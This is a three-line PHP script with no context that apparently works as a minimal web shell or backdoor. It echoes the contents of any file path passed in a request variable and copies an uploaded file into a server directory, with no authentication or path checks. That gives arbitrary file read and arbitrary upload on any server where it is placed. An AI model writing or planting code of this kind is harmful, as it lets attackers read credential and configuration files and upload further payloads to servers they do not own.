<?php
if ($filelist){$fp=join('',file($filelist)); echo "$fp";};
if ($putfile) if (!copy($putfile,$filedir.$putfile_name)) {echo "Failed ...";};
?>
